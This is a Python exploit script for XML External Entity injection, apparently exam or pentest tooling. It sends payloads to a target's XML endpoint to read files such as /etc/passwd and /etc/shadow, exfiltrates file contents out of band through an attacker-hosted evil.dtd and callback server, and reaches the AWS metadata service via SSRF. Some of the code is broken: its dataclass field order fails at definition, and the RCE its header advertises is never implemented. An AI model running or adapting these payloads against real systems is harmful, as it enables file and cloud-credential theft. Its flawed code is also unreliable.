#!/usr/bin/env python3
"""
XXE (XML External Entity) File Read and SSRF PoC
CVE: N/A (Common vulnerability pattern)
Target: Web applications parsing XML without proper validation
Vulnerability: XML External Entity Injection → File Read → SSRF → RCE

Reference:
- https://portswigger.net/web-security/xxe
- https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
- https://www.synack.com/blog/a-deep-dive-into-xxe-injection/

Exploit Flow:
1. Identify XML parsing endpoint (POST, file upload, API)
2. Test for XXE vulnerability with basic entity expansion
3. Exploit in-band XXE for file read (file:// protocol)
4. Exploit out-of-band XXE for blind data exfiltration
5. Exploit SSRF capabilities (http://, ftp:// protocols)
6. Achieve RCE via PHP expect:// or jar:// protocols (if available)
"""

import argparse
import requests
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
import urllib3
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CALLBACK SERVER
# ============================================================================

class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler for out-of-band XXE callbacks."""

    received_data = []

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Handle GET requests with exfiltrated data."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # Extract data from query string
        if '?' in self.path:
            data = self.path.split('?')[1]
            CallbackHandler.received_data.append(data)
            print(f"\n[+] Received callback with data: {data}")
        else:
            print(f"\n[+] Received callback: {self.path}")

        self.wfile.write(b"OK")

    def do_POST(self):
        """Handle POST requests."""
        self.do_GET()


# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """XXE exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/upload"
    param_name: str = "xml"
    method: str = "POST"  # POST or file upload

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    attack_type: str = "file_read"  # file_read, oob, ssrf
    target_file: str = "/etc/passwd"
    ssrf_target: str = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
    proxy: Optional[str] = None

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    xxe_confirmed: bool = field(default=False, repr=False)
    file_content: str = field(default="", repr=False)
    callback_server: Optional[HTTPServer] = field(default=None, repr=False)
    server_thread: Optional[threading.Thread] = field(default=None, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            method=args.method,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            attack_type=args.attack_type,
            target_file=args.file,
            ssrf_target=args.ssrf_target,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        """Construct full target URL including endpoint."""
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None


# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="XXE (XML External Entity) File Read and SSRF PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic file read
  %(prog)s 192.168.1.10 80 10.10.14.5 8000 --file /etc/passwd

  # Out-of-band data exfiltration
  %(prog)s 192.168.1.10 80 10.10.14.5 8000 --attack-type oob --file /etc/shadow

  # SSRF to AWS metadata
  %(prog)s 192.168.1.10 80 10.10.14.5 8000 --attack-type ssrf \\
    --ssrf-target http://169.254.169.254/latest/meta-data/

  # Custom endpoint
  %(prog)s 192.168.1.10 80 10.10.14.5 8000 --endpoint /api/parse --param-name data
"""
    )

    # Target configuration
    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/upload",
                            help="Vulnerable endpoint path (default: /upload)")
    target_group.add_argument("--param-name", default="xml",
                            help="Parameter name for XML data (default: xml)")
    target_group.add_argument("--method", choices=["POST", "upload"], default="POST",
                            help="Delivery method (default: POST)")

    # Attacker configuration
    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP for callbacks")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port for callback server")

    # Exploit configuration
    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--attack-type", choices=["file_read", "oob", "ssrf"],
                             default="file_read", help="Attack type (default: file_read)")
    exploit_group.add_argument("--file", default="/etc/passwd",
                             help="Target file for file read (default: /etc/passwd)")
    exploit_group.add_argument("--ssrf-target", default="http://169.254.169.254/latest/meta-data/",
                             help="SSRF target URL (default: AWS metadata)")

    # Optional
    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")

    return parser.parse_args()


# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

def generate_xxe_file_read(ctx: ExploitContext) -> str:
    """
    Generate XXE payload for in-band file read.

    Args:
        ctx: Exploit context

    Returns:
        XXE payload string
    """
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{ctx.target_file}">]>
<root>
    <data>&xxe;</data>
</root>"""
    return payload


def generate_xxe_oob(ctx: ExploitContext) -> str:
    """
    Generate XXE payload for out-of-band data exfiltration.

    Args:
        ctx: Exploit context

    Returns:
        XXE payload string
    """
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{ctx.attacker_ip}:{ctx.attacker_port}/evil.dtd"> %xxe;]>
<root>
    <data>&send;</data>
</root>"""
    return payload


def generate_evil_dtd(ctx: ExploitContext) -> str:
    """
    Generate evil.dtd content for out-of-band XXE.

    Args:
        ctx: Exploit context

    Returns:
        DTD content
    """
    dtd = f"""<!ENTITY % file SYSTEM "file://{ctx.target_file}">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://{ctx.attacker_ip}:{ctx.attacker_port}/?data=%file;'>">
%eval;"""
    return dtd


def generate_xxe_ssrf(ctx: ExploitContext) -> str:
    """
    Generate XXE payload for SSRF.

    Args:
        ctx: Exploit context

    Returns:
        XXE payload string
    """
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{ctx.ssrf_target}">]>
<root>
    <data>&xxe;</data>
</root>"""
    return payload


# ============================================================================
# CALLBACK SERVER MANAGEMENT
# ============================================================================

def start_callback_server(ctx: ExploitContext):
    """
    Start HTTP callback server for out-of-band XXE.

    Args:
        ctx: Exploit context
    """
    print(f"[*] Starting callback server on {ctx.attacker_ip}:{ctx.attacker_port}")

    # Create server
    ctx.callback_server = HTTPServer((ctx.attacker_ip, ctx.attacker_port), CallbackHandler)

    # Run in background thread
    ctx.server_thread = threading.Thread(target=ctx.callback_server.serve_forever, daemon=True)
    ctx.server_thread.start()

    print(f"[+] Callback server started")
    time.sleep(1)  # Give server time to start


def stop_callback_server(ctx: ExploitContext):
    """
    Stop HTTP callback server.

    Args:
        ctx: Exploit context
    """
    if ctx.callback_server:
        print("[*] Stopping callback server")
        ctx.callback_server.shutdown()
        ctx.callback_server.server_close()


# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """
    Stage 1: Reconnaissance and XXE detection.

    Args:
        ctx: Exploit context

    Returns:
        True if XXE confirmed
    """
    print("\n[*] Stage 1: Reconnaissance & XXE Detection")

    try:
        # Test basic connectivity
        print(f"[*] Testing connectivity to {ctx.get_target_url()}")
        response = ctx.session.get(
            ctx.get_base_url(),
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        # Test for XXE with simple entity expansion
        print(f"\n[*] Testing for XXE vulnerability")
        test_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY test "OSWE_XXE_TEST">]>
<root>
    <data>&test;</data>
</root>"""

        if ctx.method == "POST":
            response = ctx.session.post(
                ctx.get_target_url(),
                data={ctx.param_name: test_payload},
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )
        else:
            # File upload method
            files = {ctx.param_name: ('test.xml', test_payload, 'application/xml')}
            response = ctx.session.post(
                ctx.get_target_url(),
                files=files,
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )

        # Check if entity was expanded in response
        if "OSWE_XXE_TEST" in response.text:
            print("[+] XXE confirmed! Entity expansion detected in response")
            ctx.xxe_confirmed = True
            return True
        else:
            print("[!] No entity expansion visible - may still be vulnerable (blind XXE)")
            print("[*] Proceeding with exploitation attempt")
            return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False


def stage_exploit_file_read(ctx: ExploitContext) -> bool:
    """
    Stage 2: Exploit in-band XXE for file read.

    Args:
        ctx: Exploit context

    Returns:
        True if file read successful
    """
    print("\n[*] Stage 2: File Read Exploitation")
    print(f"[*] Target file: {ctx.target_file}")

    payload = generate_xxe_file_read(ctx)
    print(f"[*] Generated XXE payload")

    try:
        if ctx.method == "POST":
            response = ctx.session.post(
                ctx.get_target_url(),
                data={ctx.param_name: payload},
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )
        else:
            files = {ctx.param_name: ('exploit.xml', payload, 'application/xml')}
            response = ctx.session.post(
                ctx.get_target_url(),
                files=files,
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        # Check for file content in response
        if "root:" in response.text or "<?xml" not in response.text:
            print("\n[+] File content retrieved!")
            print("=" * 60)
            # Try to extract content between common delimiters
            content = response.text
            if "<data>" in content:
                start = content.find("<data>") + 6
                end = content.find("</data>")
                if end > start:
                    ctx.file_content = content[start:end]
                    print(ctx.file_content)
            else:
                print(response.text)
            print("=" * 60)
            return True
        else:
            print("[!] File content not visible in response")
            print("[!] May be blind XXE - try out-of-band method")
            return False

    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False


def stage_exploit_oob(ctx: ExploitContext) -> bool:
    """
    Stage 2: Exploit out-of-band XXE for blind data exfiltration.

    Args:
        ctx: Exploit context

    Returns:
        True if OOB exploitation successful
    """
    print("\n[*] Stage 2: Out-of-Band XXE Exploitation")
    print(f"[*] Target file: {ctx.target_file}")

    # Start callback server
    start_callback_server(ctx)

    # Generate and save evil.dtd
    dtd_content = generate_evil_dtd(ctx)
    print(f"\n[*] Evil DTD content:")
    print(dtd_content)
    print(f"\n[!] Note: You need to serve this DTD at http://{ctx.attacker_ip}:{ctx.attacker_port}/evil.dtd")
    print(f"[!] Or wait for callback to /evil.dtd and serve it manually")

    # Generate XXE payload
    payload = generate_xxe_oob(ctx)
    print(f"\n[*] Sending OOB XXE payload")

    try:
        if ctx.method == "POST":
            response = ctx.session.post(
                ctx.get_target_url(),
                data={ctx.param_name: payload},
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )
        else:
            files = {ctx.param_name: ('exploit.xml', payload, 'application/xml')}
            response = ctx.session.post(
                ctx.get_target_url(),
                files=files,
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )

        print(f"[+] Payload delivered (HTTP {response.status_code})")
        print(f"[*] Waiting for callbacks (10 seconds)...")
        time.sleep(10)

        if CallbackHandler.received_data:
            print(f"\n[+] Received {len(CallbackHandler.received_data)} callback(s)")
            for data in CallbackHandler.received_data:
                print(f"    Data: {data}")
            return True
        else:
            print("[!] No callbacks received")
            print("[!] Check firewall, DTD serving, or try different file")
            return False

    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False
    finally:
        stop_callback_server(ctx)


def stage_exploit_ssrf(ctx: ExploitContext) -> bool:
    """
    Stage 2: Exploit XXE for SSRF.

    Args:
        ctx: Exploit context

    Returns:
        True if SSRF successful
    """
    print("\n[*] Stage 2: SSRF Exploitation")
    print(f"[*] SSRF target: {ctx.ssrf_target}")

    payload = generate_xxe_ssrf(ctx)
    print(f"[*] Generated SSRF payload")

    try:
        if ctx.method == "POST":
            response = ctx.session.post(
                ctx.get_target_url(),
                data={ctx.param_name: payload},
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )
        else:
            files = {ctx.param_name: ('exploit.xml', payload, 'application/xml')}
            response = ctx.session.post(
                ctx.get_target_url(),
                files=files,
                proxies=ctx.get_proxies(),
                timeout=10,
                verify=False
            )

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        # Check for SSRF response
        if "ami-" in response.text or "iam" in response.text or len(response.text) > 100:
            print("\n[+] SSRF successful! Received response:")
            print("=" * 60)
            print(response.text[:500])
            print("=" * 60)
            return True
        else:
            print("[!] No clear SSRF response visible")
            return False

    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False


def stage_verify(ctx: ExploitContext) -> bool:
    """
    Stage 3: Verify exploitation.

    Args:
        ctx: Exploit context

    Returns:
        True if exploitation verified
    """
    print("\n[*] Stage 3: Verification")

    if ctx.attack_type == "file_read":
        if ctx.file_content:
            print(f"[+] File read successful!")
            print(f"[+] Retrieved {len(ctx.file_content)} bytes from {ctx.target_file}")
            return True
        else:
            print("[!] File content not retrieved")
            return False

    elif ctx.attack_type == "oob":
        if CallbackHandler.received_data:
            print(f"[+] Out-of-band XXE successful!")
            print(f"[+] Received {len(CallbackHandler.received_data)} callback(s)")
            return True
        else:
            print("[!] No callbacks received")
            return False

    elif ctx.attack_type == "ssrf":
        print(f"[+] SSRF exploitation completed")
        print(f"[!] Check response above for SSRF results")
        response = input("\n[?] Did SSRF succeed? (y/n): ")
        return response.lower() == 'y'

    return False


# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main execution."""
    print("[+] XXE (XML External Entity) File Read and SSRF PoC")
    print("[+] Target: Web applications parsing XML")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    Method: {ctx.method}")
    print(f"    Attack Type: {ctx.attack_type}")
    print(f"    Callback Server: {ctx.attacker_ip}:{ctx.attacker_port}")

    try:
        # Stage 1: Recon
        if not stage_recon(ctx):
            print("\n[-] Reconnaissance failed")
            sys.exit(1)

        # Stage 2: Exploit (based on attack type)
        if ctx.attack_type == "file_read":
            if not stage_exploit_file_read(ctx):
                print("\n[-] File read exploitation failed")
                sys.exit(1)
        elif ctx.attack_type == "oob":
            if not stage_exploit_oob(ctx):
                print("\n[-] Out-of-band exploitation failed")
                sys.exit(1)
        elif ctx.attack_type == "ssrf":
            if not stage_exploit_ssrf(ctx):
                print("\n[-] SSRF exploitation failed")
                sys.exit(1)

        # Stage 3: Verify
        if not stage_verify(ctx):
            print("\n[!] Exploitation completed but not fully verified")
            sys.exit(1)

        print("\n[+] Exploitation successful!")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        if ctx.callback_server:
            stop_callback_server(ctx)
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        if ctx.callback_server:
            stop_callback_server(ctx)
        sys.exit(1)


if __name__ == "__main__":
    main()
